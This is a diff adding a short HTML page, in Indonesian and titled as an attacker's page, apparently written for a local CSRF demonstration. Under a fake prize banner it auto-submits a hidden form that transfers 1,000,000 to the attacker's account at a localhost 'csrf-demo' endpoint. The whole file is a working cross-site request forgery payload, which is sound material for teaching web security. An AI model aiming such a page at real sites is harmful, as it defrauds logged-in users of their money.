@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head><title>Halaman Penyerang</title></head>
+<body>
+  <h2>Selamat! Klik untuk hadiah!</h2>
+  <form action="http://localhost/csrf-demo/transfer.php" method="POST" id="attackForm">
+    <input type="hidden" name="to" value="rekening_penyerang">
+    <input type="hidden" name="amount" value="1000000">
+  </form>
+
+  <script>
+    document.getElementById("attackForm").submit();
+  </script>
+</body>
+</html>
